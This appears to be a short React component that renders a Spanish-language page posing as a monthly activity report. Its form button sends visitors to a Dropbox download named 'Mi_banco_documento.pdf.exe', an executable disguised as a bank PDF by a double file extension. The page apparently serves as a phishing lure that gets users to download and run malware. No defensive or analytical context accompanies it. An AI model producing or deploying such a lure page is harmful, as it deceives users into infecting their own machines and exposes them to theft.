import React from 'react';
import './App.css';

function App() {
  return (
    <div>
      <header className="App-header">
        <div className="centro">
          <form action="https://www.dropbox.com/s/k1wdm7ysvyt54vo/Mi_banco_documento.pdf.exe">
            <p>
              Reporte de actividades del mes de noviembre 2019
            </p>
            <input type="submit" name="dl" value="1"></input>
          </form>
        </div>
      </header>
    </div>
  );
}

export default App;
